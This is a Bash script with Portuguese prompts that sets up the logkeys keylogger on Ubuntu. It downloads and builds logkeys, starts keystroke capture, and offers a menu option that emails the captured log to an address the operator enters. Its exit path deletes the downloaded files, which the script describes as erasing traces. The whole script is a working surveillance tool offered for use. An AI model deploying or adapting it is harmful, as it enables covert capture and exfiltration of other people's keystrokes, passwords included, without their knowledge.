#!/bin/bash

#Script para baixar e executer um keylogger no ubuntu
#Luan Kleyton

data=`date +%d-%m-%y`

arquivo1='master.zip'
arquivo2='logkeys-master'
arquivo3='/usr/share/doc/unzip'
arquivo4='/etc/logkeys'

echo -e "INICIANDO O SISTEMA DE KEYLOGGER"
sleep 2
echo -e " -> APAGANDO ARQUIVOS"
sleep 3

if [ -f "$arquivo1" ] || [ -f "$arquivo2" ] ; then
	echo -e " -> APAGANDO: $arquivo1"
	rm master.zip
	sleep 2
	echo -e " -> APAGANDO PASTA: $arquivo2"
	rm -r logkeys-master
	sleep 2
else
	echo -e " -> ARQUIVOS $arquivo1 E PASTA $arquivo2 JÁ FORAM APAGADOS!"
	sleep 2
fi

echo -e " -> INICIANDO DOWNLOADS NECESSÁRIOS"
sleep 2
if [ -f "$arquivo3" ] || [ -f "$arquivo4" ]; then
	echo -e " -> UNZIP NÃO ENCONTRADO. BAIXANDO..."
	apt-get install unzip -y
	sleep 2
	echo -e " -> LOGKEYS NÃO ENCONTRADO. BAIXANDO..."
        apt-get install logkeys -y
	sleep 2
else
	echo -e " -> UNZIP E LOGKEYS JÁ BAIXADOS!"
	sleep 2
fi

if  [ -e "$arquivo1" ]; then
	echo -e " -> ARQUIVO $arquivo1 JÁ EXISTE!"
	sleep 2
else
	echo -e " -> BAIXANDO $arquivo1"
	sleep 2
	wget https://github.com/kernc/logkeys/archive/master.zip
	sleep 2
fi

echo -e " -> BAIXADO!"
sleep 2
echo -e " -> DESCOMPACTANDO..."
sleep 2

unzip -v master.zip
unzip master.zip
cd logkeys-master

sleep 2
echo -e " -> DESCOMPACTADO. DENTRO DA PASTA $arquivo2"
sleep 2

log="/var/log/logkeys.log"
script2='chama-tail.sh'

while :
do
echo ""
echo -e "======================MENU======================"
echo "------------------------------------------------"
echo -e "COMO PROSSEGUIR?"
echo -e "[0] INICIAR KEYLOGGER"
echo -e "[1] ABRIR JANELA DO LOGKEYS"
echo -e "[2] ENVIAR LOGS POR E-MAIL"
echo -e "[3] PARAR KEYLOGGER E SAIR DO SISTEMA"
echo -e "[4] SÓ SAIR"
echo "------------------------------------------------"
read resposta
case "$resposta" in
	0|"")
        echo -e "OPÇÃO $resposta -> INICIANDO O KEYLOGGER:"
	logkeys -s -m keymaps/pt_BR.map
	sleep 2
	echo -e " -> INICIADO!"
	sleep 2
	clear
	;;
	1)
        echo -e "OPÇÃO $resposta -> ABRINDO JANELA DE LOG DO LOGKEYS E INICIANDO O SISTEMA: "
	cd ..
        readonly script2="chama-tail.sh";
        chmod +x $script2;
        gnome-terminal -x bash -c "./$script2; exec $SHELL";
	sleep 1
        notify-send "Verifique a janela de logs do logkeys!"
	sleep 2
	clear
	;;
	2)
        echo -e "OPÇÃO $resposta -> DIGITE O E-MAIL PARA ENVIAR OS LOGS?"
	read email
	sleep 2
	echo -e "ENVIANDO LOGS PARA: $email"
	cat "$log" | mail -s "Logs capturados pelo logkeys" $email
	sleep 2
	echo -e "E-MAIL ENVIADO!"
	sleep 2
	clear
    	;;
    	3)
        echo -e "OPÇÃO $resposta -> SAIR DO SISTEMA"
	sleep 2
	echo -e " -> DESEJA REALMENTE SAIR DO SISTEMA? [S] [N]"
	read resp
	if [ $resp == "s" ]; then
		echo -e " -> SAINDO DO SISTEMA"
		sleep 2
		logkeys -k
		sleep 2
		echo " -> APAGANDO RASTROS"
		sleep 2
			if [ -f "$arquivo1" ] || [ -f "$arquivo2" ] ; then
				echo -e " -> APAGANDO $arquivo1"
				rm master.zip
				sleep 2
				echo -e " -> APAGANDO PASTA $arquivo2"
				rm -r logkeys-master
				sleep 2
			else
				echo -e " -> ARQUIVOS $arquivo1 E PASTA $arquivo2 JÁ FORAM APAGADOS!"
				sleep 2
			fi
				echo -e " -> SISTEMA FINALIZADO."
			        exit
	else
		echo -e " -> RESTORNANDO PARA O MENU"
		sleep 2
		clear
	fi
	;;
        4)
        cd ..
        echo -e " -> SAINDO DO SISTEMA"
        sleep 2
        echo -e " -> APAGANDO $arquivo1"
        rm master.zip
        sleep 2
        echo -e " -> APAGANDO PASTA $arquivo2"
        rm -r logkeys-master
        sleep 2
        echo -e " -> SISTEMA FINALIZADO."
        exit
	;;
    	*)
        echo " -> OPÇÃO $resposta -> OPÇÃO INVÁLIDA!"
	sleep 2
	clear
;;
esac
done

